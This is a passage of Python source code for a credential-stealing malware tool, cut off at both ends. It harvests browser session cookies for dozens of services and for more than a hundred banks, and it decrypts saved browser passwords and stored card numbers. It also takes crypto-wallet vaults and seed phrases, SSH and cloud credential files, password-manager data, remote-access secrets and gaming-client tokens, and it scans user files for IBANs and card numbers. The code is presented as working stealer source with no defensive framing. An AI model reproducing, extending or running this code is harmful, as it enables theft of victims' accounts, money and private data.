        "aws": re.compile(r"AKIA[0-9A-Z]{16}"),
        "stripe": re.compile(r"(?:sk|pk)_(?:live|test)_[A-Za-z0-9]{10,}"),
    }

    def run(self) -> Dict[str, Any]:
        out: Dict[str, List[Dict[str, Any]]] = {}
        for app, pattern in self.APPS.items():
            root = Path(os.path.expandvars(pattern))
            if not root.is_dir():
                continue
            hits = self._scan(root)
            if hits:
                out.setdefault(app, []).extend(hits)
        return out

    def _scan(self, root: Path) -> List[Dict[str, Any]]:
        hits: List[Dict[str, Any]] = []
        targets: List[Path] = []
        for suffix in ("*.log", "*.ldb", "*.json"):
            try:
                targets.extend(list(root.rglob(suffix))[:40])
            except Exception:
                continue
        for path in targets:
            try:
                if path.stat().st_size > 3_000_000:
                    continue
                text = path.read_text("utf-8", "ignore")
            except Exception:
                continue
            for label, pattern in self.PATTERNS.items():
                for match in pattern.findall(text)[:3]:
                    value = match if isinstance(match, str) else match[0]
                    hits.append({"kind": label, "file": path.name, "value": value[:180]})
            if len(hits) > 30:
                return hits
        return hits


class Cookies:
    """Cookie jars per service. Any cookie on a bank host is kept."""

    TARGETS = {
        "roblox": ("roblox.com", {".ROBLOSECURITY"}),
        "youtube": ("youtube.com", {"SID", "HSID", "SSID", "APISID", "SAPISID",
                                    "__Secure-1PSID", "__Secure-3PSID"}),
        "google": ("google.com", {"SID", "HSID", "SSID", "APISID", "SAPISID",
                                  "__Secure-1PSID", "__Secure-3PSID"}),
        "gmail": ("mail.google.com", {"GMAIL_AT", "SID", "HSID"}),
        "twitter": ("x.com", {"auth_token", "ct0"}),
        "twitter_old": ("twitter.com", {"auth_token", "ct0"}),
        "instagram": ("instagram.com", {"sessionid", "ds_user_id", "csrftoken"}),
        "facebook": ("facebook.com", {"c_user", "xs", "datr"}),
        "tiktok": ("tiktok.com", {"sessionid", "sid_tt"}),
        "steam": ("steamcommunity.com", {"steamLoginSecure", "sessionid"}),
        "github": ("github.com", {"user_session", "__Host-user_session_same_site"}),
        "gitlab": ("gitlab.com", {"_gitlab_session"}),
        "twitch": ("twitch.tv", {"auth-token", "persistent"}),
        "spotify": ("spotify.com", {"sp_dc", "sp_key"}),
        "netflix": ("netflix.com", {"NetflixId", "SecureNetflixId"}),
        "disney": ("disneyplus.com", {"__dcfduid", "session"}),
        "amazon": ("amazon.com", {"session-id", "at-main", "sess-at-main"}),
        "ebay": ("ebay.com", {"ebay", "dp1"}),
        "paypal": ("paypal.com", {"TLTSID", "x-pp-s", "cookie_check"}),
        "binance": ("binance.com", {"BNC-Uuid", "cr00"}),
        "coinbase": ("coinbase.com", {"session"}),
        "kraken": ("kraken.com", {"session"}),
        "bybit": ("bybit.com", {"secure-token"}),
        "okx": ("okx.com", {"ok-session"}),
        "kucoin": ("kucoin.com", {"KC_HTTPS_SESSIONID"}),
        "discord": ("discord.com", {"token", "__dcfduid", "__sdcfduid"}),
        "epic": ("epicgames.com", {"EPIC_SSO", "EPIC_SESSION"}),
        "riot": ("riotgames.com", {"ssid", "clid", "csid", "tdid"}),
        "battlenet": ("battle.net", {"BAYEUX_BROWSER", "JSESSIONID"}),
        "reddit": ("reddit.com", {"reddit_session", "token_v2"}),
        "linkedin": ("linkedin.com", {"li_at", "JSESSIONID"}),
        "microsoft": ("login.microsoftonline.com", {"ESTSAUTH", "ESTSAUTHPERSISTENT"}),
        "dropbox": ("dropbox.com", {"t", "__Host-js_csrf"}),
        "mega": ("mega.nz", {"sid"}),
        "protonmail": ("protonmail.com", {"AUTH-"}),
        "yandex": ("yandex.com", {"Session_id", "sessionid2"}),
        "vk": ("vk.com", {"remixsid"}),
        "xbox": ("xbox.com", {"XboxLive"}),
        "playstation": ("playstation.com", {"PD-ID"}),
        "nintendo": ("nintendo.com", {"__Host-nc_sid"}),
        "ubisoft": ("ubisoft.com", {"UBISOFT_SESSION"}),
        "ea": ("ea.com", {"ea_sid"}),
        "gog": ("gog.com", {"gog-al"}),
        "cloudflare": ("cloudflare.com", {"cf_clearance"}),
        "digitalocean": ("digitalocean.com", {"_digitalocean_session"}),
        "heroku": ("heroku.com", {"heroku_session"}),
        "vercel": ("vercel.com", {"__Secure-next-auth.session-token"}),
        "aws": ("aws.amazon.com", {"aws-userInfo", "aws-creds"}),
        "azure": ("portal.azure.com", {"sessionId"}),
        "grafana": ("grafana.com", {"grafana_session"}),
        "atlassian": ("atlassian.com", {"cloud.session.token"}),
        "shopify": ("shopify.com", {"_secure_session_id"}),
        "aliexpress": ("aliexpress.com", {"xman_us_f", "aep_usuc_f"}),
        "mercadolibre": ("mercadolibre.com", {"ssid", "orguseridp"}),
    }

    BANKS = {
        "chase": "chase.com", "bankofamerica": "bankofamerica.com",
        "wellsfargo": "wellsfargo.com", "citibank": "citibank.com",
        "usbank": "usbank.com", "pnc": "pnc.com", "truist": "truist.com",
        "capitalone": "capitalone.com", "tdbank": "td.com", "ally": "ally.com",
        "schwab": "schwab.com", "fidelity": "fidelity.com", "etrade": "etrade.com",
        "discover": "discover.com", "amex": "americanexpress.com",
        "synchrony": "synchronybank.com", "navyfederal": "navyfederal.org",
        "usaa": "usaa.com", "regions": "regions.com", "fifththird": "fifththird.com",
        "huntington": "huntington.com", "keybank": "key.com",
        "citizensbank": "citizensbank.com", "hsbc": "hsbc.com",
        "santander_us": "santanderbank.com", "sofi": "sofi.com", "chime": "chime.com",
        "varo": "varo.com", "robinhood": "robinhood.com", "webull": "webull.com",
        "barclays_uk": "barclays.co.uk", "hsbc_uk": "hsbc.co.uk",
        "lloyds": "lloydsbank.com", "natwest": "natwest.com", "rbs": "rbs.co.uk",
        "santander_uk": "santander.co.uk", "nationwide": "nationwide.co.uk",
        "halifax": "halifax.co.uk", "monzo": "monzo.com", "starling": "starlingbank.com",
        "revolut": "revolut.com", "tsb": "tsb.co.uk", "virginmoney": "virginmoney.com",
        "firstdirect": "firstdirect.com", "bankofscotland": "bankofscotland.co.uk",
        "ing_nl": "ing.nl", "rabobank": "rabobank.nl", "abnamro": "abnamro.nl",
        "bunq": "bunq.com", "deutschebank": "deutsche-bank.de",
        "commerzbank": "commerzbank.de", "sparkasse": "sparkasse.de", "dkb": "dkb.de",
        "n26": "n26.com", "ing_de": "ing-diba.de", "postbank": "postbank.de",
        "bnpparibas": "bnpparibas.fr", "societegenerale": "societegenerale.fr",
        "creditagricole": "credit-agricole.fr", "lcl": "lcl.fr",
        "banquepostale": "banquepostale.fr", "boursorama": "boursorama.com",
        "caixabank": "caixabank.es", "bbva_es": "bbva.es", "santander_es": "santander.es",
        "sabadell": "sabadell.com", "bankinter": "bankinter.com", "ing_es": "ing.es",
        "openbank": "openbank.es", "unicredit": "unicredit.it",
        "intesasanpaolo": "intesasanpaolo.com", "fineco": "fineco.it",
        "poste_italiane": "poste.it", "millenniumbcp": "millenniumbcp.pt",
        "novobanco": "novobanco.pt", "cgd": "cgd.pt", "activobank": "activobank.pt",
        "raiffeisen_at": "raiffeisen.at", "erstebank": "erstebank.at",
        "bankaustria": "bankaustria.at", "nbg": "nbg.gr", "alpha": "alpha.gr",
        "eurobank": "eurobank.gr", "piraeus": "piraeusbank.gr", "pkobp": "pkobp.pl",
        "mbank": "mbank.pl", "ing_pl": "ing.pl", "millennium_pl": "millennium.pl",
        "csas": "csas.cz", "kb": "kb.cz", "moneta": "moneta.cz", "otp": "otpbank.hu",
        "seb": "seb.se", "nordea": "nordea.se", "handelsbanken": "handelsbanken.se",
        "swedbank": "swedbank.se", "danskebank": "danskebank.dk", "nykredit": "nykredit.dk",
        "dnb": "dnb.no", "sparebank1": "sparebank1.no", "op_fi": "op.fi",
        "ubs": "ubs.com", "postfinance": "postfinance.ch", "zkb": "zkb.ch",
        "bancolombia": "bancolombia.com", "davivienda": "davivienda.com",
        "bbva_co": "bbva.com.co", "bancodebogota": "bancodebogota.com",
        "colpatria": "scotiabankcolpatria.com", "itau_br": "itau.com.br",
        "bradesco": "bradesco.com.br", "santander_br": "santander.com.br",
        "caixa_br": "caixa.gov.br", "nubank": "nubank.com.br",
        "inter_br": "bancointer.com.br", "bancodobrasil": "bancodobrasil.com.br",
        "banorte": "banorte.com", "bbva_mx": "bbva.mx", "santander_mx": "santander.com.mx",
        "banamex": "banamex.com", "bancoazteca": "bancoazteca.com.mx",
        "bcp": "bcp.com.pe", "interbank": "interbank.pe",
        "bancodechile": "bancodechile.cl", "bancoestado": "bancoestado.cl",
        "santander_cl": "santander.cl", "galicia": "galicia.com.ar",
        "macro": "macro.com.ar", "bancion": "bancion.com.ar", "brubank": "brubank.com",
        "mercadopago": "mercadopago.com",
    }

    INTERESTING = ("session", "auth", "token", "sess", "jsession", "sid", "login",
                   "secure", "user", "remember", "id")

    def __init__(self) -> None:
        self.buckets: Dict[str, List[Dict[str, Any]]] = {name: [] for name in self.TARGETS}
        self.buckets.update({f"bank:{name}": [] for name in self.BANKS})
        self.buckets["otros"] = []

    def _match(self, host: str, name: str) -> Optional[str]:
        host = host.lstrip(".").lower()
        for label, (domain, names) in self.TARGETS.items():
            if domain in host and (name in names or any(name.startswith(n) for n in names)):
                return label
        for label, domain in self.BANKS.items():
            if domain in host:
                return f"bank:{label}"
        return None

    def _push(self, bucket: str, record: Dict[str, Any]) -> None:
        store = self.buckets[bucket]
        cap = 60 if AGGRESSIVE else 30
        if bucket.startswith("bank:"):
            cap = 14
        if len(store) < cap:
            store.append(record)

    def scan(self) -> Dict[str, List[Dict[str, Any]]]:
        for name, root in Browsers.roots().items():
            key = Browsers.key(root)
            for profile in Browsers.profiles(root):
                self._chromium(root, profile, name, key)
        self._firefox()
        for bucket, records in self.buckets.items():
            if bucket.startswith("bank:") and len(records) > 1:
                records.sort(key=lambda record: (not any(
                    token in record["name"].lower() for token in self.INTERESTING),
                    record["name"]))
                del records[14:]
        return self.buckets

    def _chromium(self, root: Path, profile: str, browser: str, key: bytes) -> None:
        path = root / profile / "Network" / "Cookies"
        if not path.is_file():
            path = root / profile / "Cookies"
        connection = Browsers.db(path)
        if not connection:
            return
        try:
            rows = connection.execute("SELECT host_key,name,encrypted_value,path,expires_utc "
                                      "FROM cookies").fetchall()
        except Exception:
            rows = []
        finally:
            connection.close()
        for host, name, enc, cookie_path, expires in rows:
            value = Browsers.decrypt(enc, key)
            bucket = self._match(host, name)
            if bucket is None:
                if AGGRESSIVE and value:
                    self._push("otros", {"browser": browser, "host": host, "name": name,
                                         "value": value[:120]})
                continue
            if not value and not bucket.startswith("bank:"):
                continue
            self._push(bucket, {"browser": browser, "profile": profile, "host": host,
                                "name": name, "value": value[:240], "path": cookie_path,
                                "expires": expires})

    def _firefox(self) -> None:
        base = Browsers.firefox_root()
        if not base:
            return
        for profile in base.iterdir():
            connection = Browsers.db(profile / "cookies.sqlite")
            if not connection:
                continue
            try:
                rows = connection.execute("SELECT host,name,value FROM moz_cookies").fetchall()
            except Exception:
                rows = []
            finally:
                connection.close()
            for host, name, value in rows:
                bucket = self._match(host, name)
                if bucket:
                    self._push(bucket, {"browser": "Firefox", "profile": profile.name,
                                        "host": host, "name": name, "value": value[:240]})


class Logins:
    """Saved credentials. Chromium decrypts inline, Firefox ships key4.db."""

    def run(self) -> Dict[str, Any]:
        out: Dict[str, Any] = {"chromium": [], "firefox": {}, "count": 0}
        for name, root in Browsers.roots().items():
            key = Browsers.key(root)
            for profile in Browsers.profiles(root):
                self._chromium(root, profile, name, key, out)
        out["count"] = len(out["chromium"])
        self._firefox(out)
        return out

    @staticmethod
    def _chromium(root: Path, profile: str, browser: str, key: bytes,
                  out: Dict[str, Any]) -> None:
        connection = Browsers.db(root / profile / "Login Data")
        if not connection:
            return
        try:
            rows = connection.execute("SELECT origin_url,username_value,password_value,"
                                      "date_created FROM logins").fetchall()
        except Exception:
            rows = []
        finally:
            connection.close()
        for url, user, enc, created in rows:
            if not user and not enc:
                continue
            out["chromium"].append({"browser": browser, "profile": profile, "url": url[:200],
                                    "user": user, "password": Browsers.decrypt(enc, key)[:160],
                                    "created": created})

    @staticmethod
    def _firefox(out: Dict[str, Any]) -> None:
        base = Browsers.firefox_root()
        if not base:
            return
        for profile in base.iterdir():
            logins = profile / "logins.json"
            if not logins.is_file():
                continue
            try:
                out["firefox"].setdefault(profile.name, {})["logins"] = \
                    logins.read_text("utf-8", "ignore")[:6000]
            except Exception:
                continue
            for name in ("key4.db", "key3.db"):
                source = profile / name
                if source.is_file():
                    try:
                        out["firefox"][profile.name][name] = base64.b64encode(
                            source.read_bytes()).decode()
                    except Exception:
                        pass


class Autofill:
    def run(self) -> List[Dict[str, Any]]:
        out: List[Dict[str, Any]] = []
        for name, root in Browsers.roots().items():
            for profile in Browsers.profiles(root):
                connection = Browsers.db(root / profile / "Web Data")
                if not connection:
                    continue
                try:
                    rows = connection.execute("SELECT name,value,count FROM autofill "
                                              "WHERE value IS NOT NULL LIMIT 300").fetchall()
                except Exception:
                    rows = []
                finally:
                    connection.close()
                for field, value, uses in rows:
                    out.append({"browser": name, "field": field,
                                "value": str(value)[:220], "uses": uses})
        return out[:400]


class Wallets:
    """Extension vaults, keystores, seed files, cards and addresses."""

    EXT = {
        "nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
        "ejbalbakoplchlghecdalmeeeajnimhm": "MetaMask Beta",
        "bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
        "fmkadmapgofadopljbjfkapdkoienihi": "Keplr",
        "hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase Wallet",
        "egjidjbpglichdcondbcbdnbeeppgdph": "Trust Wallet",
        "ibnejdfjmmkpcnlpebklmnkoeoihofec": "TronLink",
        "jiidiaalihmmhddjgbdgkiljpgoljdcj": "Petra",
        "acmacodkjbdgmoleebolmdjonilkdbch": "Rabby",
        "lgmpcpglpngdoalbgeoldeajfclnhafa": "Solflare",
        "aobiamancesndgldbhfbfghdenfjjmim": "Backpack",
        "kpfopkelmapcoipemfendmdcghnegimn": "XDEFI",
        "pocmplpaccanhmnllbbkpgfliimjljgo": "Coin98",
        "odbfpeeihdkbihmopkbjmoonfanlbfcl": "Brave Wallet",
        "lpfcbjknijpeeillifnkikgncikgfhdo": "Nami",
        "dhgnlgphgchebgoemcjekedifnfpeola": "Yoroi",
    }
    FILES = {
        "Exodus": ["%APPDATA%/Exodus/exodus.wallet"],
        "Electrum": ["%APPDATA%/Electrum/wallets", "~/.electrum/wallets"],
        "Atomic": ["%APPDATA%/atomic/Local Storage/leveldb"],
        "Bitcoin Core": ["%APPDATA%/Bitcoin/wallets"],
        "Monero": ["%APPDATA%/Monero/wallets"],
        "Litecoin": ["%APPDATA%/Litecoin/wallets"],
        "Ethereum": ["%APPDATA%/Ethereum/keystore", "~/.ethereum/keystore"],
        "Geth": ["%APPDATA%/Geth/keystore"],
        "Solana": ["~/.config/solana", "%APPDATA%/solana"],
        "Coinbase": ["%APPDATA%/Coinbase/Local Storage/leveldb"],
        "Binance": ["%APPDATA%/Binance/Local Storage/leveldb"],
        "Trust": ["%APPDATA%/Trust Wallet/Local Storage/leveldb"],
    }
    SEED = re.compile(r"\b(?:[a-z]{3,8}\s+){11,23}[a-z]{3,8}\b")

    def __init__(self) -> None:
        self.out: Dict[str, Any] = {"extensions": [], "files": {}, "keystores": [],
                                    "cards": [], "addresses": [], "seeds": [], "notes": []}

    def _extensions(self) -> None:
        for name, root in Browsers.roots().items():
            for profile in Browsers.profiles(root):
                settings = root / profile / "Local Extension Settings"
                if not settings.is_dir():
                    continue
                for ext in settings.iterdir():
                    label = self.EXT.get(ext.name)
                    if not label:
                        continue
                    record = {"wallet": label, "browser": name, "profile": profile,
                              "vault": None, "iv": None, "salt": None, "accounts": []}
                    for entry in ext.iterdir():
                        if entry.suffix not in (".log", ".ldb"):
                            continue
                        try:
                            text = entry.read_text("utf-8", "ignore")
                        except Exception:
                            continue
                        for pattern, key in ((r'"data":"([^"]{40,})"', "vault"),
                                             (r'"iv":"([0-9a-fA-F]{16,})"', "iv"),
                                             (r'"salt":"([0-9a-fA-F]{16,})"', "salt")):
                            hit = re.search(pattern, text)
                            if hit and not record[key]:
                                record[key] = hit.group(1)
                        record["accounts"].extend(re.findall(r'"(0x[a-fA-F0-9]{40})"', text)[:5])
                        for seed in self.SEED.findall(text)[:1]:
                            if len(seed.split()) in (12, 15, 18, 21, 24):
                                self.out["seeds"].append({"wallet": label,
                                                          "words": len(seed.split()),
                                                          "seed": seed})
                    if record["vault"] or record["accounts"]:
                        self.out["extensions"].append(record)

    def _files(self) -> None:
        for label, paths in self.FILES.items():
            for raw in paths:
                path = Path(os.path.expandvars(os.path.expanduser(raw)))
                if not path.exists():
                    continue
                children = list(path.iterdir())[:60] if path.is_dir() else [path]
                for child in children:
                    try:
                        if not child.is_file() or child.stat().st_size > 250_000:
                            continue
                        text = child.read_text("utf-8", "ignore")
                    except Exception:
                        continue
                    self.out["files"].setdefault(label, []).append(
                        {"name": child.name, "body": text[:2500]})
                    if '"crypto"' in text or '"ciphertext"' in text or "cipherparams" in text:
                        self.out["keystores"].append({"file": str(child), "json": text[:3000]})
                    for address in re.findall(r"\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b", text)[:3]:
                        self.out["addresses"].append(address)

    def _cards(self) -> None:
        for name, root in Browsers.roots().items():
            key = Browsers.key(root)
            for profile in Browsers.profiles(root):
                connection = Browsers.db(root / profile / "Web Data")
                if not connection:
                    continue
                try:
                    rows = connection.execute(
                        "SELECT name_on_card,expiration_month,expiration_year,"
                        "card_number_encrypted FROM credit_cards LIMIT 40").fetchall()
                except Exception:
                    rows = []
                finally:
                    connection.close()
                for holder, month, year, enc in rows:
                    self.out["cards"].append({"browser": name, "holder": holder,
                                              "month": month, "year": year,
                                              "number": Browsers.decrypt(enc, key) or "(encrypted)"})

    def run(self) -> Dict[str, Any]:
        for job in (self._extensions, self._files, self._cards):
            try:
                job()
            except Exception as exc:
                self.out["notes"].append(f"{job.__name__}: {exc}")
        return self.out


class Financial:
    """IBAN, Luhn-valid cards and crypto addresses from user files."""

    IBAN = re.compile(r"\b[A-Z]{2}\d{2}[A-Z0-9]{10,30}\b")
    CARD = re.compile(r"\b(?:\d[ -]?){13,19}\b")
    BTC = re.compile(r"\b(?:bc1[a-z0-9]{25,62}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b")
    ETH = re.compile(r"\b0x[a-fA-F0-9]{40}\b")
    SUFFIX = (".txt", ".csv", ".json", ".md", ".log", ".env", ".ini", ".xml")

    def run(self) -> Dict[str, Any]:
        out: Dict[str, Any] = {"ibans": [], "cards": [], "btc": [], "eth": []}
        limit = 600 if AGGRESSIVE else 200
        seen = 0
        for folder in ("Desktop", "Documents", "Downloads", "OneDrive"):
            base = Path.home() / folder
            if not base.is_dir():
                continue
            for path in base.rglob("*"):
                if seen >= limit:
                    break
                if not path.is_file() or path.suffix.lower() not in self.SUFFIX:
                    continue
                try:
                    if path.stat().st_size > 400_000:
                        continue
                    text = path.read_text("utf-8", "ignore")
                    seen += 1
                except Exception:
                    continue
                out["ibans"].extend(self.IBAN.findall(text)[:4])
                out["btc"].extend(self.BTC.findall(text)[:3])
                out["eth"].extend(self.ETH.findall(text)[:3])
                for candidate in self.CARD.findall(text)[:3]:
                    digits = re.sub(r"\D", "", candidate)
                    if 13 <= len(digits) <= 19 and self._luhn(digits):
                        out["cards"].append(candidate.strip())
        for key in out:
            out[key] = sorted(set(out[key]))[:40]
        return out

    @staticmethod
    def _luhn(digits: str) -> bool:
        total, parity = 0, len(digits) % 2
        for index, char in enumerate(digits):
            value = int(char)
            if index % 2 == parity:
                value *= 2
                if value > 9:
                    value -= 9
            total += value
        return total % 10 == 0


class Contacts:
    EMAIL = re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,20}")
    PHONE = re.compile(r"(?<![\w.])(?:\+\d{1,3}[\s.\-]?)?(?:\(\d{2,4}\)|\d{2,4})"
                       r"[\s.\-]\d{3,4}[\s.\-]?\d{2,4}(?![\w.])")
    SUFFIX = (".txt", ".csv", ".json", ".vcf", ".md", ".log", ".htm", ".html", ".xml",
              ".ini", ".env", ".eml")

    def run(self, tokens: List[Dict[str, Any]]) -> Dict[str, List[str]]:
        emails, phones = set(), set()
        for item in tokens:
            profile = item.get("profile") or {}
            if profile.get("email"):
                emails.add(profile["email"].lower())
            if profile.get("phone"):
                self._phone(profile["phone"], phones)

        for name, root in Browsers.roots().items():
            for profile in Browsers.profiles(root):
                connection = Browsers.db(root / profile / "Web Data")
                if not connection:
                    continue
                try:
                    for (value,) in connection.execute(
                            "SELECT value FROM autofill WHERE value IS NOT NULL LIMIT 400"):
                        self._text(str(value), emails, phones)
                except Exception:
                    pass
                finally:
                    connection.close()

        limit = CONTACT_FILES * (4 if AGGRESSIVE else 1)
        seen = 0
        for folder in ("Desktop", "Documents", "Downloads", "OneDrive", "AppData"):
            base = Path.home() / folder
            if not base.is_dir():
                continue
            for path in base.rglob("*"):
                if seen >= limit:
                    break
                if not path.is_file() or path.suffix.lower() not in self.SUFFIX:
                    continue
                try:
                    if path.stat().st_size > CONTACT_BYTES:
                        continue
                    self._text(path.read_text("utf-8", "ignore"), emails, phones)
                    seen += 1
                except Exception:
                    continue
        return {"emails": sorted(emails)[:80], "phones": sorted(phones)[:80]}

    @staticmethod
    def _phone(raw: str, bucket: set) -> None:
        digits = re.sub(r"\D", "", raw)
        if not 9 <= len(digits) <= 15:
            return
        if len(set(digits)) < 3 or digits in ("0123456789", "1234567890"):
            return
        bucket.add(raw.strip()[:26])

    def _text(self, text: str, emails: set, phones: set) -> None:
        for mail in self.EMAIL.findall(text):
            if len(mail) < 60:
                emails.add(mail.lower())
        for raw in self.PHONE.findall(text):
            self._phone(raw, phones)


class Documents:
    NAMES = ("id_rsa", "id_ed25519", "id_ecdsa", ".env", "credentials", "config.json",
             "secrets.yml", "secrets.yaml", "wp-config.php", ".npmrc", ".pypirc",
             ".netrc", ".git-credentials", "kubeconfig")

    def run(self) -> Dict[str, Any]:
        out: Dict[str, List[Dict[str, Any]]] = {}
        roots = [Path.home() / name for name in
                 (".ssh", ".aws", ".azure", ".kube", ".docker",
                  "Desktop", "Documents", "Downloads")]
        for root in roots:
            if not root.is_dir():
                continue
            for path in root.rglob("*"):
                if path.name not in self.NAMES and path.suffix not in (".pem", ".key", ".ppk"):
                    continue
                try:
                    if path.stat().st_size > 60_000:
                        continue
                    text = path.read_text("utf-8", "ignore")
                except Exception:
                    continue
                out.setdefault(path.parent.name or "root", []).append(
                    {"file": path.name, "body": text[:2000]})
                if len(out) > 40:
                    return out
        return out


class Vaults:
    """Password managers, remote access tools, VPN configs and mail clients."""

    def run(self) -> Dict[str, Any]:
        out: Dict[str, Any] = {"managers": [], "remote": {}, "vpn": [], "mail": []}
        if not IS_WIN:
            return out
        appdata = Path(os.environ.get("APPDATA", ""))
        local = Path(os.environ.get("LOCALAPPDATA", ""))
        home = Path.home()

        for folder in (home / "Documents", home / "Desktop", home / "Downloads"):
            try:
                for path in list(folder.rglob("*.kdbx"))[:10]:
                    out["managers"].append({"file": str(path), "size": path.stat().st_size})
            except Exception:
                pass
        for label, path in (("Bitwarden", appdata / "Bitwarden/data.json"),
                            ("1Password", local / "1Password"),
                            ("NordPass", appdata / "NordPass"),
                            ("KeePassXC", appdata / "KeePassXC"),
                            ("Dashlane", appdata / "Dashlane")):
            if path.is_file():
                try:
                    out["managers"].append({"file": str(path),
                                            "body": path.read_text("utf-8", "ignore")[:1500]})
                except Exception:
                    pass
            elif path.is_dir():
                out["managers"].append({"file": str(path)})

        import winreg
        for label, key in (("TeamViewer", r"SOFTWARE\WOW6432Node\TeamViewer"),
                           ("AnyDesk", r"SOFTWARE\WOW6432Node\AnyDesk")):
            for name in ("Version", "ClientID", "SecurityPasswordAES", "ad.anynet.id"):
                value = Win.reg(winreg.HKEY_LOCAL_MACHINE, key, name)
                if value:
                    out["remote"].setdefault(label, {})[name] = str(value)[:200]
        rustdesk = appdata / "RustDesk/config/RustDesk.toml"
        if rustdesk.is_file():
            try:
                out["remote"]["RustDesk"] = {
                    "config": rustdesk.read_text("utf-8", "ignore")[:1200]}
            except Exception:
                pass
        rdp = local / "Microsoft/Terminal Server Client"
        if rdp.is_dir():
            for path in list(rdp.rglob("*.rdp"))[:10]:
                try:
                    out["remote"].setdefault("RDP", {})[path.name] = \
                        path.read_text("utf-8", "ignore")[:400]
                except Exception:
                    pass

        for path in (appdata / "WireGuard", home / "Documents/WireGuard"):
            if path.is_dir():
                out["vpn"].extend(str(item) for item in list(path.glob("*.conf"))[:10])
        openvpn = Path(os.environ.get("ProgramFiles", "")) / "OpenVPN/config"
        if openvpn.is_dir():
            out["vpn"].extend(str(item) for item in list(openvpn.glob("*.ovpn"))[:10])

        thunderbird = appdata / "Thunderbird/Profiles"
        if thunderbird.is_dir():
            for profile in list(thunderbird.iterdir())[:5]:
                prefs = profile / "prefs.js"
                if prefs.is_file():
                    try:
                        out["mail"].append({"profile": profile.name,
                                            "prefs": prefs.read_text("utf-8", "ignore")[:1500]})
                    except Exception:
                        pass
        return out


class Clients:
    """Roblox, Steam, Telegram, Minecraft, FTP and PuTTY artifacts."""

    def run(self) -> Dict[str, Any]:
        out: Dict[str, Any] = {}
        if not IS_WIN:
            return out
        local = Path(os.environ.get("LOCALAPPDATA", ""))
        appdata = Path(os.environ.get("APPDATA", ""))

        roblox = []
        for path in (local / "Roblox/LocalStorage").glob("*"):
            try:
                if path.is_file() and path.stat().st_size < 400_000:
                    text = path.read_text("utf-8", "ignore")
                    if "ROBLOSECURITY" in text or "_|WARNING" in text:
                        roblox.append({"file": path.name, "body": text[:2500]})
            except Exception:
                continue
        if roblox:
            out["roblox_localstorage"] = roblox[:6]

        steam = Path(os.environ.get("ProgramFiles(x86)", "")) / "Steam"
        if not steam.is_dir():
            steam = Path(os.environ.get("ProgramFiles", "")) / "Steam"
        if steam.is_dir():
            out["steam"] = {"ssfn": [item.name for item in steam.glob("ssfn*")][:10]}
            for name in ("config/loginusers.vdf", "config/config.vdf"):
                source = steam / name
                if source.is_file():
                    try:
                        out["steam"][name] = source.read_text("utf-8", "ignore")[:3000]
                    except Exception:
                        pass

        telegram = appdata / "Telegram Desktop/tdata"
        if telegram.is_dir():
            out["telegram"] = {"path": str(telegram),
                               "keys": [item.name for item in telegram.glob("*s")][:12]}

        minecraft = appdata / ".minecraft"
        for name in ("launcher_accounts.json", "launcher_profiles.json"):
            source = minecraft / name
            if source.is_file():
                try:
                    out[f"minecraft_{name}"] = source.read_text("utf-8", "ignore")[:4000]
                except Exception:
                    pass

        for label, path in (("filezilla", appdata / "FileZilla"),
                            ("winscp", appdata / "WinSCP.ini")):
            if path.is_dir():
                for name in ("recentservers.xml", "sitemanager.xml"):
                    source = path / name
                    if source.is_file():
                        try:
                            out[f"{label}_{name}"] = source.read_text("utf-8", "ignore")[:4000]
                        except Exception:
                            pass
            elif path.is_file():
                try:
                    out[label] = path.read_text("utf-8", "ignore")[:4000]
                except Exception:
                    pass

        import winreg
        sessions = Win.subkeys(winreg.HKEY_CURRENT_USER, r"Software\SimonTatham\PuTTY\Sessions")
        if sessions:
            out["putty_sessions"] = sessions[:25]
        return out


class Riot:
    def run(self) -> Dict[str, Any]:
        out: Dict[str, Any] = {"artifacts": {}, "lockfiles": [], "cookies": {},
                               "summoner": {}, "wallet": {}}
        if not IS_WIN:
            return out
        base = Path(os.environ.get("LOCALAPPDATA", "")) / "Riot Games"
        if not base.is_dir():
            return out
        for pattern in ("Riot Client/Data/*.yaml", "Riot Client/Config/*.yaml",
                        "Riot Client/Config/lockfile", "Metadata/**/*.yaml"):
            for path in base.glob(pattern):
                try:
                    text = path.read_text("utf-8", "ignore")
                except Exception:
                    continue
                out["artifacts"][path.name] = text[:3000]
                for cookie in ("ssid", "clid", "csid", "tdid", "sub"):
                    hit = re.search(rf"{cookie}:\s*\"?([A-Za-z0-9_\-.]{{16,}})\"?", text)
                    if hit:
                        out["cookies"][cookie] = hit.group(1)
        for lock in list(base.glob("**/lockfile")) + [
                Path("C:/Riot Games/League of Legends/lockfile"),
                Path("D:/Riot Games/League of Legends/lockfile")]:
            if not lock.is_file():
                continue
            try:
                parts = lock.read_text("utf-8", "ignore").strip().split(":")
                if len(parts) < 5:
                    continue
                entry = {"port": int(parts[2]), "password": parts[3], "process": parts[0]}
                out["lockfiles"].append(entry)
                self._lcu(entry, out)
            except Exception:
                continue
        return out

    @staticmethod
    def _get(port: int, password: str, endpoint: str) -> Optional[Any]:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        auth = base64.b64encode(f"riot:{password}".encode()).decode()
        request = urllib.request.Request(f"https://127.0.0.1:{port}{endpoint}",
                                         headers={"Authorization": f"Basic {auth}"})
        try:
            with urllib.request.urlopen(request, timeout=8, context=context) as response:
                return json.loads(response.read().decode("utf-8", "ignore"))
        except Exception:
            return None

    def _lcu(self, entry: Dict[str, Any], out: Dict[str, Any]) -> None:
        port, password = entry["port"], entry["password"]
        for label, endpoint in (("summoner", "/lol-summoner/v1/current-summoner"),
                                ("wallet", "/lol-inventory/v1/wallet"),
                                ("ranked", "/lol-ranked/v1/current-ranked-stats")):
            data = self._get(port, password, endpoint)
            if not data:
                continue
            if label == "summoner":
                out["summoner"] = {"name": data.get("displayName") or data.get("gameName"),
                                   "tag": data.get("tagLine"),
                                   "level": data.get("summonerLevel"),
                                   "puuid": data.get("puuid")}
            elif label == "wallet":
                out["wallet"] = data
            else:
                out[label] = data


class Network:
    PORTS = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 389, 443, 445, 587, 993,
             1433, 1521, 2049, 2375, 3000, 3306, 3389, 5000, 5432, 5900, 5984,
